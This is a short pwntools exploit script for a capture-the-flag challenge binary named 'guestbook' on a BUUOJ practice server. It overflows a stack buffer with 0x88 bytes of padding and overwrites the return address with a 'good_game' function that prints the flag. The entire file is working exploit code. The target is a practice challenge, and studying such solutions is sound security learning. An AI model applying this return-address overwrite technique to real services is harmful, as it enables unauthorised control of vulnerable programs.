from pwn import *
context.arch='amd64'

# there is a function read the flag.txt in server, just call it

# p = process('./guestbook')
p = remote('node3.buuoj.cn',28480)
elf = ELF('./guestbook',checksec='False')

p.recvuntil("Input your message:\n")

payload = 'A'*0x88 + p64(elf.sym['good_game'])
p.send(payload)

p.recvuntil("I have received your message, Thank you!\n")
print p.recv()
